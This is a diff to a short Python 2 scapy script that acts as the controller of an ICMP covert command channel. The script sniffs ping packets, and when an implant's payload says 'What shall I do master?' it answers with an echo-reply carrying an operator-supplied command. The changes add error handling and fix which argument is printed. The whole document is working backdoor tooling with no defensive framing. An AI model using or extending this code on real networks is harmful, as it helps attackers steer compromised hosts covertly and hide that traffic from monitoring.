@@ -25,18 +25,21 @@ def main(argv):
 	while 1:
 		packet = sniff(count,filter=filter)
 		for p in packet:
-			p.show2()
-			request = p['Raw'].load
-			checksum = p['ICMP'].chksum
-			ip_id = p['IP'].id
-			icmp_id = p['ICMP'].id
-			print "[*] Request checksum: (%s)" % checksum
-			print "[*] Request: " + request
-			if request == 'What shall I do master?':
-				resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sys.argv[1]
-				print "[*] Response sent: " + sys.argv[2]
-				resp.show2()
-				send(resp)
+			#p.show2()
+			try:
+				request = p['Raw'].load
+				checksum = p['ICMP'].chksum
+				ip_id = p['IP'].id
+				icmp_id = p['ICMP'].id
+				print "[*] Request checksum: (%s)" % checksum
+				print "[*] Request: " + request
+				if request == 'What shall I do master?':
+					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sys.argv[1]
+					print "[*] Response sent: " + sys.argv[1]
+				#resp.show2()
+					send(resp)
+			except: 
+				print "[X] ERROR: ", sys.exc_info()[0]  
 
 if __name__ == "__main__":
    main(sys.argv[1:])
